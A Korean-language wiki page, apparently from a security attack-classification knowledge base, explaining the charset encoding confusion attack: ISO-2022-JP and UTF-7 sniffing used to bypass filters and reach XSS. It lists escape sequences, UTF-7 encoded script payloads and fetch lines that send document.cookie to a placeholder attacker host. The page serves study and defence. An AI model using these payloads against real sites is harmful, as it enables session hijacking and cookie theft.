---
title: Charset Encoding Confusion Attack
description: 
published: true
date: 2025-07-31T18:07:59.262Z
tags: detect content‑type header, scan for meta charset tag, strip explicit charset, inject iso‑2022‑jp switch, trigger utf‑7 detection, switch to jis 0201 mode, switch to jis 0208 mode, encode with utf‑7 plus, exploit utf‑7 script tag, observe dom injection, web cache poisoning, leak cookies via js, steal data via xhr post
editor: markdown
dateCreated: 2025-07-23T11:12:14.841Z
---

# Charset Encoding Confusion Attack

## 개요

“Charset Encoding Confusion Attack”은 웹 애플리케이션의 콘텐츠 인코딩 방식('charset')을 명확하게 정의하지 않거나, 정의된 방식과 브라우저의 해석 방식이 불일치할 때 발생하는 취약점이다. 공격자는 ISO-2022-JP, Shift\_JIS 등 특수문자셋에서 특정 바이트가 HTML 제어 문자로 정규화되는 특성을 이용해, 필터링 우회 상태로 악성 스크립트가 최종 렌더링되도록 유도가능하다. 필터링 단계에서는 무해한 입력으로 처리되지만, 브라우저의 자동 인코딩 탐지 또는 다르게 적용된 charset에 따라 `<script>` 등이 해석되어 실행되며, 결과적으로 XSS 등 클라이언트 측 공격으로 이어질 수 있다.

## 분류

> 데이터 표현 모델 불일치 (Data Representation Model Gap)
> → 인코딩 및 이스케이프 처리 문제 (Encoding & Escape Handling Issues)
> → Charset Encoding Confusion Attack

## 절차

| Phase          | Description                                                                                                                                                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Reconnaissance | 응답에서 Content-Type헤더, `<meta charset>` 태그, BOM 존재 여부를 파악하고, 대상 브라우저의 자동 인코딩 감지 정책을 조사한다.                                                                                              |
| Divergence     | `charset=ISO-2022-JP` 같은 값/무효 값을 직접 주입하거나 `<meta charset>`을 삽입·삭제해서 브라우저 측 인코딩을 변경하고, `0x18`, `0x28`, `0x40` 등 ISO-2022-JP 전환 시퀀스를 최소 1회 삽입하여 Blink/Gecko의 “ISO-2022-JP 자동감지”를 유도한다. |
| Mutation       | JIS X 0201 1976 모드 전환이나 JIS X 0208 1978 모드 전환 등을 이용해 서로 다른 문자 표로 해석되도록 페이로드를 변형한다.                                                                                                   |
| Injection      | 사용자·백엔드가 의도한 인코딩 경계를 깨뜨린 뒤, 브라우저가 문자열·속성·태그를 잘못 닫도록 유도한다. `<script>` 태그, `onerror` 같은 이벤트 핸들러, 인라인 JavaScript를 삽입하여 XSS 페이로드를 주입한다.                                                  |
| Validation     | 반사된 응답 차이, 타이밍, 상태 코드 등을 관찰하거나, 브라우저 개발자 도구로 DOM 변화, 브라우저 콘솔 오류, CSP 우회 여부 등을 확인하여 성공 여부를 판단한다.                                                                                      |
| Exploitation   | JavaScript 실행, 세션 하이재킹, CSRF 우회, 웹 캐시 오염 등 목표 행위를 수행한다.                                                                                                                              |
| Exfiltration   | 쿠키, 로컬 스토리지, CSRF 토큰, CSRF 보호 응답 등을 공격자 도메인으로 전송한다.                                                                                                                                  |

<div style="text-align: left;">
  <img
    src="/charset_encoding_confusion_attack.png"
    alt="Charset Encoding Confusion Attack 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Detect Content-Type Header</td>
      <td><code>Content-Type: text/html; charset=UTF-8</code></td>
      <td>응답의 Content-Type 헤더를 확인하여 인코딩이 명시되어 있는지 조사한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Scan for Meta Charset Tag</td>
      <td><code>&lt;meta charset="UTF-8"&gt;</code></td>
      <td>HTML 내 charset 명시 여부를 통해 명시 인코딩이 적용되었는지 확인한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Divergence

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Strip Explicit Charset</td>
      <td><code>&lt;meta charset=...&gt; 제거</code></td>
      <td>charset을 제거해 브라우저가 자동 감지 모드로 전환되도록 유도한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Inject ISO-2022-JP Switch</td>
      <td><code>\x1B$@</code></td>
      <td>ISO-2022-JP 시작 시퀀스를 삽입해 브라우저 인코딩 판단을 왜곡한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Trigger UTF-7 Detection</td>
      <td><code>&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-7"/&gt;</code></td>
      <td>UTF-7 해석 모드로 유도해 인코딩 오해를 발생시킨다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

### Mutation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Switch to JIS 0201 Mode</td>
      <td><code>\x1B(J</code></td>
      <td>ASCII 기반의 JIS X 0201 모드로 전환해 문자 매핑을 변화시킨다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Switch to JIS 0208 Mode</td>
      <td><code>\x1B$B</code></td>
      <td>JIS X 0208 멀티바이트 문자셋으로 전환해 해석 경계를 변화시킨다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Encode with UTF-7 Plus</td>
      <td><code>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></td>
      <td>‘+’ 기호 기반의 UTF-7 인코딩을 이용해 스크립트 삽입을 수행한다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

### Injection

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Exploit UTF-7 Script Tag</td>
      <td>
        <code>&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-7"&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code>
      </td>
      <td>UTF-7로 오인해 스크립트를 해석하도록 유도한다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Observe DOM Injection</td>
      <td>-</td>
      <td>Developer tools에서 &lt;script> 삽입 여부를 확인한다.</td>
      <td>[C]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Web Cache Poisoning</td>
      <td>ISO-2022-JP 스니핑 가능한 비정상 404 페이지 캐시</td>
      <td>Server: Content-Type: text/html 헤더 있지만 charset 누락 → CDN이 캐시 → Browser: ISO-2022-JP 자동감지로 악성 스크립트 실행.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Leak Cookies via JS</td>
      <td><code>fetch('https://attacker/?c='+document.cookie)</code></td>
      <td>`document.cookie` 값을 외부 서버로 전송해 쿠키 탈취</td>
      <td>[D]</td>
    </tr>
    <tr>
      <td>Steal Data via XHR POST</td>
      <td><code>&lt;script&gt;fetch('https://attacker',{method:'POST',body:document.cookie})&lt;/script&gt;</code></td>
      <td>fetch/XHR 이용해 민감 데이터(쿠키, 저장소 등) 전송</td>
      <td>[E]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

\[1] [Encoding Differentials: Why Charset Matters](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)
\[2] [https://troopers.de/troopers24/talks/r3hxdq/](https://troopers.de/troopers24/talks/r3hxdq/)
\[3] [https://html.spec.whatwg.org/multipage/](https://html.spec.whatwg.org/multipage/)
\[4] [https://www.rfc-editor.org/rfc/rfc1468.html](https://www.rfc-editor.org/rfc/rfc1468.html)
\[5] [https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/](https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/)

## 기타 참고문헌

\[A] [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#utf-7](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#utf-7)
\[B] [https://blog.elmosalamy.com/posts/bom-sniffing-to-xss/](https://blog.elmosalamy.com/posts/bom-sniffing-to-xss/)
\[C] [https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide](https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide)
\[D] [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
\[E] [https://www.securitum.com/persistent\_threats\_via\_blind\_xss.html](https://www.securitum.com/persistent_threats_via_blind_xss.html)
